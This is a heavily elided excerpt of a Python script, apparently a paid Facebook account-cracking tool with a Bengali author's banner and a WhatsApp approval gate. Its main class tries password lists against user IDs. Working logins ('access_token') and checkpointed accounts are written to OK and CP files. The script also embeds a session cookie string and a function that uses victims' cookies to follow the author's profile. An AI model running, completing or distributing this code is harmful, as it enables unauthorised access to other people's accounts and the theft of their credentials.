...
|__/  \__/|__/  |__/    |__/    |________/|________/|__/     |__/
             ...
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
             \033[1;93m▇▇➣    \033[1;91mAUTHOR   : 𝐍𝐀𝐘𝐄𝐄𝐌 𝐍𝐀𝐖𝐀𝐙        \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;94mGITHUB   : 𝐍𝐀𝐘𝐄𝐄𝐌𝐕𝐀𝐈        \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;93mFACEBOOK : 𝐍𝐚𝐲𝐞𝐞𝐦 𝐍𝐚𝐰𝐚𝐳        \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;92mWHATSAPP : +01827673253     \033[1;93m▇▇
             \033[1;93m▇▇➣       \033[1;91mTHIS TOOL IS PAID          \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;94mGIVE ME 200 tk FOR APRVAL     \033[1;93m▇▇
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
...
def reg():
    ...
    try:
        ...
        reg2()
    r = requests.get('https://github.com/nayeemvai/paid/blob/main/Approvel.txt').text
    if to in r:
        time.sleep(2)
        bsn_menu()
    else:
...
def reg2():
    ...
    input('\033[1;97m               PRESS ENTER  TO SEND TOKEN')
    time.sleep(3.5)
    tks = 'Dear%20𝐍𝐀𝐘𝐄𝐄𝐌-sir,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+id
    os.system('am start https://wa.me/+01827673253?text=' + tks)
...
def chigozie():
    ...
    if cookie in['OPEN','Open','open']:
      jalan("\n  %s* %sanda akan di arahkan ke YouTube"%(O,O));time.sleep(3);os.system('xdg-open https://wa.me/+01827673253');chigozie()
    try:
        ...
        os.system('xdg-open https://wa.me/+01827673253')
        bsn_menu()
...
def bsn_menu():
    ...
    IP = ipm["origin"]
    print("             [*]. CREATED BY : 𝐍𝐀𝐘𝐄𝐄𝐌 𝐍𝐀𝐖𝐀𝐙");time.sleep (0.03)
    print("             [*]. FACEBOOK   : 𝐍𝐀𝐘𝐄𝐄𝐌 𝐍𝐀𝐖𝐀𝐙");time.sleep (0.03)
    print("             [*]. GITHUB     : 𝐍𝐀𝐘𝐄𝐄𝐌𝐕𝐀𝐈");time.sleep (0.03)   
...
class __bsn__:
    ...
    def __api__(self, user, __chi__):
        global ok,cp,loop
        for i in list('\|-/'):
            sys.stdout.write(f'\r [𝐍𝐀𝐘𝐄𝐄𝐌] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
            sys.stdout.flush()
        for pw in __chi__:
            pw = pw.lower()
            ...
            if "access_token" in p:
                print('\r [OK-𝐍𝐀𝐘𝐄𝐄𝐌] %s | %s ' % (user,pw))
                wrt = '%s|%s' % (user,pw)
                ok.append(wrt)
                open('𝐍𝐀𝐘𝐄𝐄𝐌-ok.txt' , 'a').write('%s\n' % wrt)
                break
                ...
                try:
                    ...
                    print('\r%s \033[1;91m[CP-𝐍𝐀𝐘𝐄𝐄𝐌] %s | %s ' % (K,user,pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('𝐍𝐀𝐘𝐄𝐄𝐌-cp.txt' , 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
    ...
    # 'cookie': 'datr=4_ybZC8J9laCGWkN_Dhp7ECo; sb=4_ybZCOOHMtogt1K-EGpSv37; m_pixel_ratio=2.924999952316284; wd=370x691; fr=0PTGIQ6YFa4jjX4gf..Bkm_zj.hj.AAA.0.0.Bkn9dg.AWVQreDc1P0',
    ...
    def follow(self,session,coki):
        r = BeautifulSoup(session.get("https://www.facebook.com/profile.php?id=100004052541589&mibextid=ZbWKwL",cookies={"cookie":coki}).text,"html.parser")
